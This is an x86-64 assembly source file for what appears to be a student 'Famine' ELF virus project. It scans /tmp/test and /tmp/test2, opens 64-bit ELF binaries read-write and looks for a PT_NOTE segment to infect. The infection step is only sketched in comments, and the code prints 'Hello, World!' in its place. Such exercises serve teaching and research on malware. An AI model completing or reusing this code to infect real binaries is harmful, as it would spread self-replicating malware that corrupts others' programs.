%define SYS_READ    0
%define SYS_WRITE   1
%define SYS_OPEN	2
%define SYS_CLOSE   3
%define SYS_CHDIR   80
%define SYS_EXIT    60
%define NULL        0

%define BARRA_N     10

section .text
    global _start

_start:
    mov rax, 57
    syscall

    test rax, rax
    jnz exit_success

    push rdx
    push rbp           ; save the base pointer
    mov rbp, rsp       ; set the base pointer to the current stack pointer
    sub rsp, 5000      ; reserving 5000 bytes
    mov r15, rsp       ; r15 = malloc(5000)

    lea rdi, [rel folder1] ; rdi = "/tmp/test"
    call chdir ; change directory to "/tmp/test"
    call open_dir ; change directory to "/tmp/test"
    call getdents
    xor rcx, rcx ; rcx = 0
    call iterate_loop ; iterate over directory entries

    ; this is supposed to work properly
    lea rdi, [rel folder2] ; rdi = "/tmp/test2"
    call chdir ; change directory to "/tmp/test2"
    call open_dir ; change directory to "/tmp/test2"
    call getdents
    xor rcx, rcx ; rcx = 0
    call iterate_loop ; iterate over directory entries

    call restore_stack ; exit

open_dir:
    mov rax, SYS_OPEN ; syscall number for sys_open
    mov rsi, 0 ; O_RDONLY
    syscall ; invoke operating system to open directory
    test rax, rax ; check for error
    js safe_exit ; if error, exit
    ret

chdir:
    mov rax, SYS_CHDIR ; syscall number for sys_chdir
    syscall ; invoke operating system to change directory
    test rax, rax ; check for error
    js safe_exit ; if error, exit
    ret

getdents:
    mov rdi, rax ; save file descriptor
    mov rax, 217 ; syscall number for sys_getdents64
    lea rsi, [r15 + 400] ; buffer to store directory entries
    mov rdx, 1024 ; size of buffer
    syscall ; invoke operating system to read directory entries
    test rax, rax ; check for error
    js safe_exit ; if error, exit

    mov qword [r15 + 350], rax ; save number of bytes read
    mov rax, SYS_CLOSE ; syscall number for sys_close
    syscall ; invoke operating system to close directory

    ret

iterate_loop:

    push rcx
    cmp byte [r15 + 418 + rcx], 8 ; check if d_type is DT_REG
    jne .go_to_next
    

    lea rdi, [rcx + r15 + 419] ; filename
    mov rsi, 2 ; O_RDWR
    mov rdx, 0 ; mode
    mov rax, SYS_OPEN ; syscall number for sys_open
    syscall ; invoke operating system to open file
    ; call open_file ; open file
    mov r9, rax ; save file descriptor
    cmp rax, 0 ; check for error
    jbe .go_to_next ; if error, go to next entry


    ; read ehdr

    call pread ; read ELF header
    ; test rax, rax ; check for error
    ; jz .go_to_next ; if error, go to next entry


    ; mov rsi, r15 ; save ELF header address
    ; add rsi, 144 ; point to ELF header
    ; mov rdx, 16
    ; call print_bytes

    ; check if it's an ELF file
    cmp dword [r15 + 144], 0x464c457f ; check if it's an ELF file (magic number)
    jnz .close_file ; if not, go to next entry


    cmp byte [r15 + 148], 0x2 ; check if it's a 64-bit ELF file
    jne .close_file ; if not, go to next entry

    ;check if it's already infected, if i'm appending to EOF the signature i can check there.

    mov r8, [r15 + 176]
    mov rbx, 0
    mov r14, 0

    call find_phdr ; find PT_NOTE segment
    cmp rax, 2 ; check if it's a PT_NOTE segment
    jne .close_file ; if not, go to next entry

    call hello_world  ; print "Hello, World!"

    ; infect
        ; for infection i must append virus to the file, then i must
        ; modify the entry point to point to the virus
        ; then i must modify the virus to jump to the original entry point

    ; close file

    .close_file:
        mov rax, SYS_CLOSE ; syscall number for sys_close
        mov rdi, r9 ; file descriptor
        syscall ; invoke operating system to close file

    .go_to_next:
        pop rcx
        add cx, word [rcx + r15 + 416]
        cmp rcx, qword [r15 + 350]
        jne iterate_loop

    call new_line
ret

open_file:
    lea rdi, [rcx + r15 + 419] ; filename
    mov rsi, 2 ; O_RDWR
    mov rdx, 0 ; mode
    mov rax, SYS_OPEN ; syscall number for sys_open
    syscall ; invoke operating system to open file
    ret

pread:
    mov rdi, r9 ; file descriptor (use the correct file descriptor)
    lea rsi, [r15 + 144] ; buffer to store ELF header
    mov rdx, 64 ; size of ELF header
    mov r10, 0 ; offset (start of the file)
    mov rax, 17 ; syscall number for sys_pread64
    syscall ; invoke operating system to read ELF header
    ret

find_phdr:
    mov rdi, r9 ; file descriptor
    lea rsi, [r15 + 208] ; buffer to store program header
    mov dx, word [r15 + 198] ; size of program header
    mov r10, r8 ; offset (start of program header)
    mov rax, 17 ; syscall number for sys_pread64
    syscall ; invoke operating system to read program header

    cmp byte [r15 + 208], 4 ; check if it's a PT_NOTE segment
    jne .continue
    mov rax, 2
    ret; if yes, infect

    .continue:
        inc rbx ; increase program header counter
        cmp bx, word [r15 + 200] ; check if we looped through all program headers
        jl .continue2 ; if yes, close file
        mov rax, 3
        ret ; if no valid program header was found, close file

    .continue2:
        add r8w, word [r15 + 198] ; add size of program header to offset
        jnz find_phdr ; read next program header

print_bytes:
    ; rsi points to the bytes to print
    ; rdx is the number of bytes to print
    mov rax, SYS_WRITE
    mov rdi, 1 ; stdout
    syscall
    ret


print_string:
    ; Print string pointed to by rdi
    mov rax, SYS_WRITE ; syscall number for sys_write
    mov rdi, 1 ; file descriptor (stdout)
    mov rdx, 256 ; max length
    syscall
    ret


;debug
hello_world:
; PRINT
    mov rax, 1 ; syscall number for sys_write
    mov rdi, 1 ; file descriptor 1 is stdout
    lea rsi, [rel hello] ; address of string to output
    mov rdx, 14 ; number of bytes
    syscall ; invoke operating system to do the write
    ret
; PRINT
;debug

new_line:
    mov rax, 1 ; syscall number for sys_write
    mov rdi, 1 ; file descriptor 1 is stdout
    lea rsi, [rel newline] ; address of string to output
    mov rdx, 1 ; number of bytes
    syscall ; invoke operating system to do the write
    ret


safe_exit:
    mov rax, SYS_EXIT ; syscall number for sys_exit
    xor rdi, rdi ; exit code 0
    syscall ; invoke operating system to exit


folder1 db "/tmp/test", NULL
folder2 db "/tmp/test2", NULL

hello db 'Hello, World!', BARRA_N, NULL
newline db  BARRA_N, NULL

signature db "Famine project coded by gemartin", NULL


restore_stack:
    mov rsp, rbp       ; restore the stack pointer
    pop rbp            ; restore the base pointer
    pop rdx            ; restore rdx

exit_success:
    xor rdi, rdi
    mov rax, SYS_EXIT
    syscall
